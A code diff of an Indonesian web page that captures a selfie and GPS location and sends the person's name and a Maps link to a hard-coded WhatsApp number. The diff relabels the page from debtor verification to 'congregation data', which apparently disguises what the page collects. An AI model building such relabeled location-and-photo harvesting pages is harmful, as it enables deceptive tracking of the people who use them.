@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Verifikasi Kehadiran & Lokasi</title>
+    <title>data jamaah</title>
     <style>
         :root {
             --primary: #25D366;
@@ -19,6 +19,7 @@
             justify-content: center;
             align-items: center;
             min-height: 100vh;
+            box-sizing: border-box;
         }
         .card {
             background: white;
@@ -99,8 +100,9 @@
             cursor: pointer;
             transition: background 0.2s;
         }
-        .btn:active {
-            opacity: 0.9;
+        .btn:disabled {
+            background-color: #ccc;
+            cursor: not-allowed;
         }
         .btn-secondary {
             background-color: #e4e6eb;
@@ -117,7 +119,7 @@
 <body>
 
     <div class="card">
-        <h2>Verifikasi Data Debitur</h2>
+        <h2>Data Jamaah</h2>
         <p>Silakan lengkapi nama dan ambil foto kondisi terkini untuk konfirmasi lokasi.</p>
 
         <div class="form-group">
@@ -141,8 +143,7 @@
     </div>
 
     <script>
-        // Konfigurasi Nomor WhatsApp Tujuan (Ganti dengan nomor Anda, format internasional tanpa tanda + atau 0 di depan, misal: 628123456789)
-        const NOMOR_WHATSAPP_TUJUAN = "628123456789"; 
+        const NOMOR_WHATSAPP_TUJUAN = "6285716813005"; 
 
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
@@ -158,7 +159,6 @@
         let stream = null;
         let isPhotoTaken = false;
 
-        // 1. Inisialisasi Kamera
         async function initCamera() {
             try {
                 stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
@@ -169,7 +169,6 @@
             }
         }
 
-        // 2. Ambil Koordinat GPS
         function initGPS() {
             if ("geolocation" in navigator) {
                 navigator.geolocation.getCurrentPosition(
@@ -177,6 +176,7 @@
                         latitude = position.coords.latitude;
                         longitude = position.coords.longitude;
                         statusDiv.innerText = "Lokasi GPS berhasil dikunci.";
+                        validateForm();
                     },
                     (error) => {
                         alert("Gagal mendeteksi lokasi. Pastikan GPS/Lokasi HP Anda Aktif.");
@@ -189,11 +189,9 @@
             }
         }
 
-        // Jalankan saat halaman dibuka
         initCamera();
         initGPS();
 
-        // Tombol Ambil Foto
         btnSnap.addEventListener('click', () => {
             const context = canvas.getContext('2d');
             canvas.width = video.videoWidth;
@@ -205,7 +203,6 @@
             photoPreview.style.display = 'block';
             video.style.display = 'none';
 
-            // Matikan stream kamera setelah foto diambil
             if (stream) {
                 stream.getTracks().forEach(track => track.stop());
             }
@@ -216,7 +213,6 @@
             validateForm();
         });
 
-        // Tombol Ulangi Foto
         btnRetake.addEventListener('click', () => {
             photoPreview.style.display = 'none';
             video.style.display = 'block';
@@ -237,12 +233,11 @@
             }
         }
 
-        // Tombol Kirim ke WhatsApp
         btnSend.addEventListener('click', () => {
             const nama = inputNama.value.trim();
             const gmapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
             
-            const textPesan = `Halo, berikut data verifikasi saya:%0A` +
+            const textPesan = `Halo, berikut data jamaah:%0A` +
                               `*Nama:* ${nama}%0A` +
                               `*Lokasi Terkini (Gmaps):* ${gmapsLink}`;
 
